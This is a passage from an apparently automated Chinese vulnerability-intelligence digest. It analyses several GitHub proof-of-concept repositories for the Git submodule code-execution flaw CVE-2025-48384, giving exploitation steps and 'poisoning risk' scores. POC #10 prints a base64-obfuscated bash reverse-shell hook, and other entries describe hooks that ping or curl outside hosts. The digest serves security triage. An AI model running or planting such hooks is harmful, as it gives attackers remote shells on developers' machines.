*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

